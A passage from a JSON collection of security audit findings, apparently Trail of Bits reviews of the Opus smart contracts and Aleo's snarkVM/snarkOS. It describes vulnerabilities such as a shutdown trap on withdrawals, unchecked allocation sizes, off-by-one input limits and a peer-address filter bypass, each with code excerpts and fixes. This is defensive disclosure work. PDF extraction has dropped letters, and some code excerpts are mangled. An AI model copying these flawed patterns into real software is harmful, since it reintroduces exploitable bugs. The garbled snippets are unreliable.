        "body": "When the system is shut down, the Caretaker module is responsible for withdrawing as much collateral as possible to back the yin supply as close to 1:1 as possible. To do this, the shut function is called. It will mint any nal budget surpluses, calculate the amount of yang needed to back the yin supply, and pull the collateral from the Sentinel . It will then proceed to irreversibly kill the Shrine . Notably, the shut function does not kill the Absorber , in order to allow stakers to withdraw their yin. Trove owners can then call the release function to reclaim any remaining yang in a trove: // Loop over yangs deposited in trove and transfer to trove owner loop { match yangs_copy.pop_front() { Option :: Some (yang) => { let deposited_yang: Wad = shrine.get_deposit(*yang, trove_id); let asset_amt: u128 = if deposited_yang.is_zero() { 0 } else { deposited_yang); let exit_amt: u128 = sentinel.exit(*yang, trove_owner, trove_id, // Seize the collateral only after assets have been // transferred so that the asset amount per yang in Gate // does not change and user receives the correct amount shrine.seize(*yang, trove_id, deposited_yang); exit_amt }; released_assets.append(AssetBalance { address: *yang, amount: asset_amt }); }; }; }, Option :: None => { break; }, Figure 7.1: Seizing of collateral from the Shrine in caretaker.cairo#L285-L304 However, as a result of shutting down the system and withdrawing yang from the Shrine , the Shrine s loan-to-value (LTV) ratio increases, and there is a high chance that recovery mode will be enabled. This is problematic because withdrawing yin from the Absorber is not possible when recovery mode is active; furthermore, since the systems total yin supply is xed at shutdown, it is impossible to turn recovery mode o: fn assert_can_remove ( self : @ContractState, request: Request ) { assert ( ! self .shrine.read().is_recovery_mode(), 'ABS: Recovery Mode active'); assert ( request .timestamp.is_non_zero(), 'ABS: No request found'); assert ( !request .has_removed, 'ABS: Only 1 removal per request'); let current_timestamp: u64 = starknet::get_block_timestamp(); let removal_start_timestamp: u64 = request .timestamp + request .timelock; assert ( removal_start_timestamp <= current_timestamp , 'ABS: Request is not valid yet'); assert ( current_timestamp <= removal_start_timestamp + REQUEST_VALIDITY_PERIOD, 'ABS: Request has expired'); } Figure 7.2: The assert_can_remove helper function in absorber.cairo#L896-L906 Exploit Scenario The Caretaker shuts down the system, and trove owners call release to reclaim any leftover collateral. As a result, the Shrine enters recovery mode because the systems total LTV surpassed the 70% system threshold. Alice, a staker in the Absorber , goes to remove her yin in order to call the reclaim function and get back a proportion of system collateral; however, because recovery mode is active, she is prevented from withdrawing her yin and loses her assets permanently. Recommendations Short term, allow users to remove their yin when the Shrine is killed regardless of whether recovery mode is active. Long term, improve the unit test coverage to uncover edge cases and ensure that the system behaves as intended. Ensure that all system features are appropriately disabled or enabled during component shutdowns, and document invariants that should hold when the system components are not live.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Exceptionally redistributed yangs are not included in compensation for absorptions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "During a redistribution, if the redistributed trove has yangs that no other troves have deposited as collateral, then that yang will be split evenly among all of the other yangs. This is known as an exceptional redistribution. Because an exceptional redistribution changes the collateral composition of a trove, the pull_redistributed_debt_and_yangs function is used to return an array of updated yang amounts for a trove. The get_trove_health function then uses these values to calculate a troves health after an exceptional redistribution: // Calculate debt let compounded_debt: Wad = self .compound(trove_id, trove, interval); let (updated_trove_yang_balances, compounded_debt_with_redistributed_debt) = self .pull_redistributed_debt_and_yangs(trove_id, trove_yang_balances, compounded_debt); if updated_trove_yang_balances.is_some() { let (new_threshold, new_value) = self .get_threshold_and_value(updated_trove_yang_balances.unwrap(), interval); threshold = self .scale_threshold_for_recovery_mode(new_threshold); value = new_value; } let ltv: Ray = wadray::rdiv_ww(compounded_debt_with_redistributed_debt, value); Health { threshold, ltv, value, debt: compounded_debt_with_redistributed_debt } Figure 8.1: The calculation done by the get_trove_health function in shrine.cairo#L1068-L1082 During an absorption, the return values of the get_trove_health function are used to calculate the percentage of compensation given to the caller. This percentage is then used in the free function to remove collateral from the trove and send said collateral to the caller: let trove_health: Health = shrine.get_trove_health(trove_id); let ( trove_penalty, max_purge_amt, pct_value_to_compensate, _, ltv_after_compensation, value_after_compensation ) = self .preview_absorb_internal(trove_health) .expect( 'PU: Not absorbable' ); let caller: ContractAddress = get_caller_address(); let absorber: IAbsorberDispatcher = self .absorber.read(); // If the absorber is operational, cap the purge amount to the absorber's balance // (including if it is zero). let purge_amt = if absorber.is_operational() { min(max_purge_amt, shrine.get_yin(absorber.contract_address)) } else { WadZeroable::zero() }; // Transfer a percentage of the penalty to the caller as compensation let compensation_assets: Span < AssetBalance > = self .free(shrine, trove_id, pct_value_to_compensate, caller); // Melt the trove's debt using the absorber's yin directly // This needs to be called even if `purge_amt` is 0 so that accrued interest // will be charged on the trove before `shrine.redistribute`. // This step is also crucial because it would revert if the Shrine has been killed, thereby // preventing further liquidations. shrine.melt(absorber.contract_address, trove_id, purge_amt); Figure 7.2: The call to free before the call to charge during an absorption in absorber.cairo#L269-L302 However, although the yang amounts including exceptional redistributions are used in the calculation, the troves deposits are not correctly updated to reect their inclusion. The charge function (called by shrine.melt ) is responsible for updating the troves deposits; however, it is called after the compensation is given to the caller. As a result, the caller gets less compensation than intended. Exploit Scenario After an exceptional redistribution, Alices trove is eligible for absorption. Bob goes to call absorb ; however, because the exceptionally redistributed yangs are not pulled into the trove, Bob does not receive them as compensation. Recommendations Short term, move the call to shrine.melt before the call to the free function so that the troves deposits are correctly updated. Long term, improve the unit test coverage to uncover edge cases and ensure that the system behaves as intended. Evaluate the correct order of operations for each call sequence and validate that necessary state updates are performed before important calculations or transference of funds. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Denial-of-service vectors in FromBytes implementations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "We identied several implementations of the FromBytes::read_le function that use an unvalidated number of elements to allocate a vector with the Vec::with_capacity function. This function panics when the provided capacity exceeds isize::MAX, allowing an attacker to crash the application if the binary architecture is 32 bits. // Read the ratifications. let num_ratifications = u32::read_le(&mut reader)?; let mut ratifications = Vec::with_capacity(num_ratifications as usize); Figure 1.1: ledger/block/src/bytes.rs#4143 Figure 1.1 shows an instance of this nding, in which a u32 element is read and immediately used to allocate the vector. For a u32 element to be larger than isize::MAX, the binary architecture must be 32 bits, such as wasm32, an architecture targeted by Aleo. Therein, u32::MAX is larger than isize::MAX (which equals i32::MAX). We identied the following locations that use this (or a similar) pattern:  ledger/block/src/bytes.rs#4143  utilities/src/bytes.rs#L146-L147  sonic_pc/data_structures.rs#L67-L68, L78-L79, L88-L89, L99-L100, L120-L121, and L139-L140  ledger/narwhal/batch-certificate/src/bytes.rs#L32-L34, ledger/narwhal/subdag/src/bytes.rs#L35-L37, ledger/narwhal/batch-header/src/bytes.rs#L46-L48, ledger/committee/src/bytes.rs#L30-L30  num_certificates and num_rounds in ledger/narwhal/subdag/src/bytes.rs#L27-L44  ledger/narwhal/data/src/lib.rs#L100-L117, ledger/narwhal/batch-header/src/bytes.rs#L36-L43, ledger/coinbase/src/helpers/coinbase_solution/bytes.rs#L17-L22, curves/src/templates/bls12/g2.rs#L65-L68, ledger/block/src/transactions/bytes.rs#L27-L32  node/sync/locators/src/block_locators.rs#L253-L255 and L263-L265, node/narwhal/src/event/worker_ping.rs#L54-L64 Appendix C includes a Semgrep rule used to identify four variants of the issue in the snarkVM codebase and three in the snarkOS codebase. Exploit Scenario An attacker provides a serialized data structure with a value larger than i32::MAX. Deserialization of these bytes in wasm32 machines causes a panic and the system to halt. Recommendations Short term, add code to validate all values that could be attacker-controlled and that determine allocation size within the application. Include the Semgrep rule provided in appendix C in the CI/CD pipeline to prevent code with the same issue from being deployed in the future. Long term, add fuzz testing that supports all targeted architectures to the deserialization routines.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Faulty validation enables more than the intended number of inputs on nalize commands ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The add_input functions for the FinalizeCore and ClosureCore structures allow one element to be inserted above the N::MAX_INPUTS value due to an o-by-one error in the inequality. The inequality should check whether the current number of inputs is less than N::MAX_INPUTS, but in the current implementation, the validation allows nalize and closure statements with N::MAX_INPUTS + 1 elements. #[inline] fn add_input(&mut self, input: Input<N>) -> Result<()> { // Ensure there are no commands in memory. ensure!(self.commands.is_empty(), \"Cannot add inputs after commands have been added\"); // Ensure the maximum number of inputs has not been exceeded. ensure!(self.inputs.len() <= N::MAX_INPUTS, \"Cannot add more than {} inputs\", N::MAX_INPUTS); Figure 2.1: synthesizer/program/src/finalize/mod.rs#8995 #[inline] fn add_input(&mut self, input: Input<N>) -> Result<()> { // Ensure there are no instructions or output statements in memory. ensure!(self.instructions.is_empty(), \"Cannot add inputs after instructions have been added\"); ensure!(self.outputs.is_empty(), \"Cannot add inputs after outputs have been added\"); // Ensure the maximum number of inputs has not been exceeded. ensure!(self.inputs.len() <= N::MAX_INPUTS, \"Cannot add more than {} inputs\", N::MAX_INPUTS); Figure 2.2: synthesizer/program/src/closure/mod.rs#7986 Recommendations Short term, modify the checks to validate the maximum number of allowed inputs to prevent the o-by-one error. Long term, add positive and negative tests for these invariants: tests that fail because they have one too many inputs, and tests that pass because they have exactly the allowed number of inputs. 3. Parsing di\u0000erences between the aleo.abnf grammar and the implementation Severity: Informational Diculty: N/A Type: Data Validation Finding ID: TOB-ALEO-3 Target: Several les",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. Function, closure, and nalize deserialization routines allow large memory allocations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The function, closure, and nalize deserialization routines do not validate the number of input and output objects described in the serialized data. The validation occurs only in the later calls to the add_input and add_output functions, allowing an attacker to use enough memory for 216-1 input and 216-1 output objects. This limit is much larger than the limit of 16 objects imposed in the add_input and add_output functions. /// Reads the function from a buffer. #[inline] fn read_le<R: Read>(mut reader: R) -> IoResult<Self> { // Read the function name. let name = Identifier::<N>::read_le(&mut reader)?; // Read the inputs. let num_inputs = u16::read_le(&mut reader)?; let mut inputs = Vec::with_capacity(num_inputs as usize); for _ in 0..num_inputs { inputs.push(Input::read_le(&mut reader)?); } // Read the instructions. let num_instructions = u32::read_le(&mut reader)?; if num_instructions > u32::try_from(N::MAX_INSTRUCTIONS).map_err(|e| error(e.to_string()))? { return Err(error(format!(\"Failed to deserialize a function: too many instructions ({num_instructions})\"))); } let mut instructions = Vec::with_capacity(num_instructions as usize); for _ in 0..num_instructions { instructions.push(Instruction::read_le(&mut reader)?); } // Read the outputs. let num_outputs = u16::read_le(&mut reader)?; let mut outputs = Vec::with_capacity(num_outputs as usize); for _ in 0..num_outputs { outputs.push(Output::read_le(&mut reader)?); } Figure 4.1: synthesizer/program/src/function/bytes.rs#2048 A similar pattern is present in both the ClosureCore::read_le and FinalizeCore:read_le functions: impl<N: Network, Instruction: InstructionTrait<N>> FromBytes for ClosureCore<N, Instruction> { /// Reads the closure from a buffer. #[inline] fn read_le<R: Read>(mut reader: R) -> IoResult<Self> { // Read the closure name. let name = Identifier::<N>::read_le(&mut reader)?; // Read the inputs. let num_inputs = u16::read_le(&mut reader)?; let mut inputs = Vec::with_capacity(num_inputs as usize); for _ in 0..num_inputs { inputs.push(Input::read_le(&mut reader)?); } // Read the instructions. let num_instructions = u32::read_le(&mut reader)?; if num_instructions > u32::try_from(N::MAX_INSTRUCTIONS).map_err(|e| error(e.to_string()))? { return Err(error(format!(\"Failed to deserialize a closure: too many instructions ({num_instructions})\"))); } let mut instructions = Vec::with_capacity(num_instructions as usize); for _ in 0..num_instructions { instructions.push(Instruction::read_le(&mut reader)?); } // Read the outputs. let num_outputs = u16::read_le(&mut reader)?; let mut outputs = Vec::with_capacity(num_outputs as usize); for _ in 0..num_outputs { outputs.push(Output::read_le(&mut reader)?); } Figure 4.2: synthesizer/program/src/closure/bytes.rs#1746 impl<N: Network, Command: CommandTrait<N>> FromBytes for FinalizeCore<N, Command> { /// Reads the finalize from a buffer. #[inline] fn read_le<R: Read>(mut reader: R) -> IoResult<Self> { // Read the associated function name. let name = Identifier::<N>::read_le(&mut reader)?; // Read the inputs. let num_inputs = u16::read_le(&mut reader)?; let mut inputs = Vec::with_capacity(num_inputs as usize); for _ in 0..num_inputs { inputs.push(Input::read_le(&mut reader)?); } Figure 4.3: synthesizer/program/src/finalize/bytes.rs#1729 Recommendations Short term, add validation to the {FunctionCore, FinalizeCore, ClosureCore}::read_le functions to prevent them from allocating unnecessarily large input and output objects. Long term, add fuzz testing to all deserialization routines.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "5. Unvalidated destination type for commit instructions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The destination type of a commit command must be set to address, eld, or group. However, the constructor fails to include such validation. Also, the deserialization and serialization routines do not validate the destination type, allowing bytes to be serialized to a CommitInstruction with an invalid destination type. impl<N: Network, const VARIANT: u8> CommitInstruction<N, VARIANT> { /// Initializes a new `commit` instruction. #[inline] pub fn new(operands: Vec<Operand<N>>, destination: Register<N>, destination_type: LiteralType) -> Result<Self> { // Sanity check that the operands is exactly two inputs. ensure!(operands.len() == 2, \"Commit instructions must have two operands\"); // Return the instruction. Ok(Self { operands, destination, destination_type }) } Figure 5.1: synthesizer/program/src/logic/instruction/operation/commit.rs#6472 This nding is of informational severity because all of the functions implemented for this instruction (evaluate, execute, and finalize) have checks that validate the destination type. Recommendations Short term, add a check that validates the destination type in the CommitInstruction constructor and the serialization and deserialization functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. Unnecessary overow checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "There are unnecessary overow checks for the unsigned division and unsigned remainder operations because these operations error out only when the second argument is zero. (U8, U8) => U8 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U16, U16) => U16 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U32, U32) => U32 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U64, U64) => U64 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U128, U128) => U128 (\"ensure overflows halt\", \"ensure divide by zero halts\"), Figure 6.1: synthesizer/program/src/logic/instruction/operation/mod.rs#499503 (U8, U8) => U8 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U16, U16) => U16 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U32, U32) => U32 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U64, U64) => U64 (\"ensure overflows halt\", \"ensure divide by zero halts\"), (U128, U128) => U128 (\"ensure overflows halt\", \"ensure divide by zero halts\"), Figure 6.2: synthesizer/program/src/logic/instruction/operation/mod.rs#158162 Recommendations Short term, remove the unnecessary overow checks for the unsigned division and remainder operations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "7. Missing upper bound validation with MAX_STRUCT_ENTRIES ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "When casting a series of values to a struct, the code validates that there are at least MIN_STRUCT_ENTRIES values before fetching the structure. For completeness, the code should also ensure that the number of values is at most MAX_STRUCT_ENTRIES. fn cast_to_struct( &self, stack: &(impl StackMatches<N> + StackProgram<N>), registers: &mut impl RegistersStore<N>, struct_name: Identifier<N>, inputs: Vec<Value<N>>, ) -> Result<()> { // Ensure the operands length is at least the minimum. if inputs.len() < N::MIN_STRUCT_ENTRIES { bail!(\"Casting to a struct requires at least {} operand\", N::MIN_STRUCT_ENTRIES) } // Retrieve the struct and ensure it is defined in the program. let struct_ = stack.program().get_struct(&struct_name)?; Figure 7.1: synthesizer/program/src/logic/instruction/operation/cast.rs#661674 Recommendations Short term, add a check that validates that the number of values to be cast to a structure is at most MAX_STRUCT_ENTRIES.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "8. Discrepancy between the matches_record function implementation and its documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The matches_record function documentation states that, besides the owner eld, the remaining record elds could be out of order. However, the function implementation relies on the same iterator order of each entry to ensure that the record matches the record layout. /// Checks that the given record matches the layout of the record type. /// Note: Ordering for `owner` **does** matter, however ordering /// for record data does **not** matter, as long as all defined members are present. pub fn matches_record( &self, stack: &(impl StackMatches<N> + StackProgram<N>), operands: &[Operand<N>], record_type: &RecordType<N>, ) -> Result<()> { Figure 8.1: synthesizer/process/src/stack/register_types/matches.rs#100108 // Ensure the operand types match the record entry types. for (operand, (entry_name, entry_type)) in operands.iter().skip(N::MIN_RECORD_ENTRIES).zip_eq(record_type.entries()) Figure 8.2: synthesizer/process/src/stack/register_types/matches.rs#159161 Recommendations Short term, determine whether the documentation needs to be updated or whether the implementation needs to consider out-of-order record data. Long term, add both positive and negative tests for this function.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "9. The /testnet3/node/env API endpoint provides binary path and repository information ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The /testnet3/node/env REST API endpoint leaks certain information about the system that the node is running on, such as the path to the snarkOS binary, Git repository branch name, or commit ID. Figure 9.1 shows an example of information that could be leaked. Depending on how the user deployed and ran the node and what else is running on the same system, the leaked information may be useful for an attacker to further exploit the machine. Also, the endpoint returns command line arguments that could contain sensitive information such as private keys. The node mitigates the exposure of private keys by omitting any arguments that start with the APrivateKey prex in the EnvInfo.register function. However, if a new sensitive argument were added to the command line arguments, there is a chance the node may not omit it. $ curl -vvv vm.aleo.org/api/testnet3/node/env ... { \"package\": \"\", \"host\": \"\", \"rustc\": \"\", \"args\": [ \"/root/.cargo/bin/snarkos\", \"start\", \"--nodisplay\", \"--cdn\", \"\", \"--connect\", \"24.199.74.2:4133,167.172.14.86:4133,159.203.146.71:4133,188.166.201.188:4133,161.35 .247.23:4133,144.126.245.162:4133,138.68.126.82:4133,159.89.211.64:4133,170.64.252.5 8:4133,143.244.211.239:4133\", \"--rest\", \"0.0.0.0:12345\", \"--logfile\", \"/dev/null\", \"--verbosity\", \"4\", \"--beacon\" ], \"repo\": \"\", \"branch\": \"\", \"commit\": \"\" } Figure 9.1: An example request to the /testnet3/node/env API endpoint Recommendations Short term, remove the binary path and Git repository information from the /testnet3/node/env API endpoint to prevent the node from leaking information that users may not want to publish. 10. Maximum peer message limit is o\u0000 by one Severity: Informational Diculty: N/A Type: Data Validation Finding ID: TOB-ALEO-10 Target: snarkos/node/router/src/inbound.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "11. The peers request/response ow allows for local IP with non-node port ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The PeerResponse handler lters out the peers list sent by another node (gure 11.1). This ltering is done through the is_bogon_address function (gure 11.2), which does not lter out special addresses such as 0.0.0.0 or 255.255.255.255. While those addresses are not valid destination addresses per RFC 1122, the 0.0.0.0 address is often treated as localhost (gure 11.4). If a node returns such an IP address, the requesting peer will then validate it once again through the is_local_ip function, called by the check_connection_attempt function, before performing a connection. This validation does not allow for a 0.0.0.0 IP address with a node port, but it does not prevent the responding peer from using a dierent port (gure 11.3). As a result, it is possible to bypass the peers address ltering, which should disallow an address to a localhost server from being returned. This bypass would allow a malicious node to cause another node to connect to its localhost address with a dierent port than a node port (4130 by default). /// Handles a `PeerResponse` message. fn peer_response(&self, _peer_ip: SocketAddr, peers: &[SocketAddr]) -> bool { // Filter out bogon addresses. let peers = peers.iter().copied().filter(|addr| !is_bogon_address(addr.ip())).collect::<Vec<_>>(); // Adds the given peer IPs to the list of candidate peers. self.router().insert_candidate_peers(&peers); true } Figure 11.1: snarkOS/node/router/src/inbound.rs#L309-L315 /// Checks if the given IP address is a bogon address. /// /// A bogon address is an IP address that should not appear on the public Internet. /// This includes private addresses, loopback addresses, and link-local addresses. pub fn is_bogon_address(ip: IpAddr) -> bool { match ip { IpAddr::V4(ipv4) => ipv4.is_loopback() || ipv4.is_private() || ipv4.is_link_local(), IpAddr::V6(ipv6) => ipv6.is_loopback(), } } Figure 11.2: snarkOS/node/tcp/src/lib.rs#L36-L45 /// Ensure we are allowed to connect to the given peer. fn check_connection_attempt(&self, peer_ip: SocketAddr) -> Result<()> { // Ensure the peer IP is not this node. if self.is_local_ip(&peer_ip) { bail!(\"Dropping connection attempt to '{peer_ip}' (attempted to self-connect)\") } ... } /// Returns `true` if the given IP is this node. pub fn is_local_ip(&self, ip: &SocketAddr) -> bool { *ip == self.local_ip() || (ip.ip().is_unspecified() || ip.ip().is_loopback()) && ip.port() == self.local_ip().port() } Figure 11.3: snarkOS/node/router/src/lib.rs#L159-L164 and #L201-L205 Exploit Scenario An attacker sets up a malicious node that returns a 0.0.0.0:port address from a PeerRequest response. They set a port so that the connecting node will connect to another server it hosts (since, for example, its own node port would be ltered). The impact of such behavior depends on the servers hosted on the node that requested more peers. Figure 11.4: A screenshot showing that connecting to a 0.0.0. Recommendations Short term, change the is_local_ip function to lter out unspecied and loopback IP addresses no matter what their port is. Long term, add tests against this behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. The refresh_and_insert function may not return previously seen timestamp ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The refresh_and_insert function (gure 12.1) should return the previously seen timestamp if such a timestamp exists. However, it returns a dierent timestamp if the map size is bigger than its capacity and the fetched key was the rst inserted item. Appendix D shows a minimal proof of concept of the problematic behavior of the refresh_and_insert function. Due to this behavior, checks for whether a given entry has been seen recently can be bypassed. If the map exceeds its capacity, an entry that has been seen recently will be removed from the map and will be treated as if it had not been seen. This occurs during the handling of Message::UnconfirmedTransaction (gure 12.2) and Message::UnconfirmedSolution messages. /// Updates the map by enforcing the maximum cache size. fn refresh<K: Eq + Hash, V>(map: &RwLock<LinkedHashMap<K, V>>) { let mut map_write = map.write(); while map_write.len() >= MAX_CACHE_SIZE { map_write.pop_front(); } } /// Updates the map by enforcing the maximum cache size, and inserts the given key. /// Returns the previously seen timestamp if it existed. fn refresh_and_insert<K: Eq + Hash>( map: &RwLock<LinkedHashMap<K, OffsetDateTime>>, key: K, ) -> Option<OffsetDateTime> { Self::refresh(map); map.write().insert(key, OffsetDateTime::now_utc()) } Figure 12.1: snarkOS/node/router/src/helpers/cache.rs#L214-L230 Message::UnconfirmedTransaction(message) => { // Clone the serialized message. let serialized = message.clone(); // Update the timestamp for the unconfirmed transaction. let seen_before = self.router().cache.insert_inbound_transaction(peer_ip, message.transaction_id).is_some(); // Determine whether to propagate the transaction. if seen_before { bail!(\"Skipping 'UnconfirmedTransaction' from '{peer_ip}'\") } Figure 12.2: The seen_before here may incorrectly be a None. (snarkOS/node/router/src/inbound.rs#L249-L254) Recommendations Short term, change the refresh_and_insert function to rst fetch the entry for the given key and only then refresh and insert the entry into the map. Long term, add tests for the refresh_and_insert function to ascertain whether the case described here works as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Structure serialization does not declare the correct number of elds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The Block serialization implementation declares six elds but serializes up to seven elds. Depending on the serialization format used, the serialization or deserialization implementations might truncate the last eld. impl<N: <N: Network> Serialize for Block<N> { /// Serializes the block to a JSON-string or buffer. fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> { match serializer.is_human_readable() { true => { let mut block = serializer.serialize_struct(\"Block\", 6)?; block.serialize_field(\"block_hash\", &self.block_hash)?; block.serialize_field(\"previous_hash\", &self.previous_hash)?; block.serialize_field(\"header\", &self.header)?; block.serialize_field(\"authority\", &self.authority)?; block.serialize_field(\"transactions\", &self.transactions)?; block.serialize_field(\"ratifications\", &self.ratifications)?; if let Some(coinbase) = &self.coinbase { block.serialize_field(\"coinbase\", coinbase)?; } block.end() } Figure 13.1: ledger/block/src/serialize.rs#L17-L35 This nding does not aect the serialization formats used in the codebase, but it does aect other serialization formats, such as serde-binary. A variant of this issue was found using a Semgrep rule, which is included in appendix C: impl<N: Network> Serialize for Request<N> { /// Serializes the request into string or bytes. fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> { match serializer.is_human_readable() { true => { let mut transition = serializer.serialize_struct(\"Request\", 9)?; transition.serialize_field(\"caller\", &self.caller)?; transition.serialize_field(\"network\", &self.network_id)?; transition.serialize_field(\"program\", &self.program_id)?; transition.serialize_field(\"function\", &self.function_name)?; transition.serialize_field(\"input_ids\", &self.input_ids)?; transition.serialize_field(\"inputs\", &self.inputs)?; transition.serialize_field(\"signature\", &self.signature)?; transition.serialize_field(\"sk_tag\", &self.sk_tag)?; transition.serialize_field(\"tvk\", &self.tvk)?; transition.serialize_field(\"tsk\", &self.tsk)?; transition.serialize_field(\"tcm\", &self.tcm)?; transition.end() } false => ToBytesSerializer::serialize_with_size_encoding(self, serializer), } } } Figure 13.2: console/program/src/request/serialize.rs#1941 The rule also found an instance in which ve elds are declared but only four are needed: Self::Record(id, checksum, value) => { let mut output = serializer.serialize_struct(\"Output\", 5)?; output.serialize_field(\"type\", \"record\")?; output.serialize_field(\"id\", &id)?; output.serialize_field(\"checksum\", &checksum)?; if let Some(value) = value { output.serialize_field(\"value\", &value)?; } output.end() } Figure 13.3: ledger/block/src/transition/output/serialize.rs#4958 We have also implemented the same rule using Dylint. This rule is now part of Dylints general rules. Recommendations Short term, update the serialize_struct call to declare the correct number of elds. Long term, add serialization and deserialization tests for types with optional elds, exercising the cases in which the value is None or Some.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "14. Potential overow in the total nalize cost ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The total finalize cost is the sum of the cost of each finalize command. This calculation does not have an overow check. finalize.commands().iter().map(|command|finalize.commands().iter().map(|command| cost(command)).sum() Figure 14.1: synthesizer/src/vm/helpers/cost.rs#L187-L187 Currently, the Finalize structure allows up to u16::MAX commands, and the highest costing command is the Set command at 1 million microcredits. Since a finalize operation with u16::MAX Set commands would still not overow the u64 type, this nding is of informational severity and is unexploitable. Recommendations Short term, review each use of sum in the codebase and determine whether overow checks should be added. Document the uses of sum that do not require such overow checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "15. The is_sequential function allows u64::MAX to 0 transitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "Due to an unchecked addition to the round number, the is_sequential function returns that 0 is after the u64::MAX round. fn is_sequential<T>(map: &BTreeMap<u64, T>) -> bool { let mut previous_round = None; for &round in map.keys() { match previous_round { Some(previous) if previous + 1 != round => return false, _ => previous_round = Some(round), } } true } Figure 15.1: ledger/narwhal/subdag/src/lib.rs#L30-L39 Recommendations Short term, guard against the unchecked addition by using checked_add. Long term, add tests for the edge case of the u64 integer type.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "16. Requests for more peers may not use newly connected peers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "When a node attempts to connect to more peers, it invokes the connect function for each candidate peer, and then it requests more peers from the connected peers. However, since the connect function returns an async task (gure 16.1) that is not waited on (gure 16.2), the connection attempts may not have nished before the node requests more peers from the connected peers. As a result, the node may not request any peers from the peers that it just connected to. The severity of this nding is informational since this is not a security risk, but we note it in this report since it may be undesired or unexpected behavior of the system. Also, the request for more peers will request peers only from three random connected peers, so even if the node waits to connect to peers, it may not request more peers from specically the newly connected ones. /// Attempts to connect to the given peer IP. pub fn connect(&self, peer_ip: SocketAddr) -> Option<JoinHandle<()>> { ... let router = self.clone(); Some(tokio::spawn(async move { // Attempt to connect to the candidate peer. match router.tcp.connect(peer_ip).await { /* (...) */ } } })) } Figure 16.1: snarkOS/node/router/src/lib.rs#L137-L156 fn handle_connected_peers(&self) { ... if num_deficient > 0 { // Initialize an RNG. let rng = &mut OsRng; // Attempt to connect to more peers. for peer_ip in self.router().candidate_peers().into_iter().choose_multiple(rng, num_deficient) { self.router().connect(peer_ip); } // Request more peers from the connected peers. for peer_ip in self.router().connected_peers().into_iter().choose_multiple(rng, 3) { info!(\"Sending PeerRequest to {peer_ip}\"); self.send(peer_ip, Message::PeerRequest(PeerRequest)); } } } Figure 16.2: The node does not wait to connect to peers. (snarkOS/node/router/src/heartbeat.rs#L189-L195) Recommendations Short term, have the node wait until it connects to new peers, and to prioritize newly connected peers, before requesting more peers from all connected peers.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "17. Committee::new allows genesis committees with more than four members to be created ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
